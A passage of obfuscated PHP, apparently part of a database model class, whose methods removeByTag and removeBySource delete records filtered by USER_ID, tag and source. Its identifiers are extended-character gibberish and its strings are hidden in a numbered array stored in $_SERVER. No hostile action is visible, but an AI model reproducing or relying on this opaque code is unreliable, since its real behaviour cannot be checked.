(is_array($fì“ğğáÕÅ)) { $fì“ğğáÕÅ = array($bİ†ãĞ¬ò¼[7], $fì“ğğáÕÅ); } $EâäåäÉä‡ = array($bİ†ãĞ¬ò¼[1406] => USER_ID, $bİ†ãĞ¬ò¼[432] => $Eœëƒ¿«Ò, $bİ†ãĞ¬ò¼[384] => $bİ†ãĞ¬ò¼[378], $bİ†ãĞ¬ò¼[383] => $fì“ğğáÕÅ); return $this->where($EâäåäÉä‡)->delete(); } protected function removeByTag($a‚«–¸Ôİ™) { $dŠ¢æ”µ’Ö =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$a‚«–¸Ôİ™) { return !1; } $eÈ¥¼¡Šİé = array($dŠ¢æ”µ’Ö[1406] => USER_ID, $dŠ¢æ”µ’Ö[432] => $a‚«–¸Ôİ™); return $this->where($eÈ¥¼¡Šİé)->delete(); } protected function removeBySource($bª”®Ö¯ØŠ) { $C¨½ùÅ®Ó =& $_SERVER[Ö¹ñÒÁ²÷]; $fˆÚ‰Šù­ = array($C¨½ùÅ®Ó[1406] => USER_ID, $C¨½ùÅ®Ó[383] => $bª”®Ö¯ØŠ, $C¨½ùÅ®Ó[432] => array($C¨½ùÅ®Ó[924], 0)); return $this->where($fˆÚ‰Šù­)->delete(); } }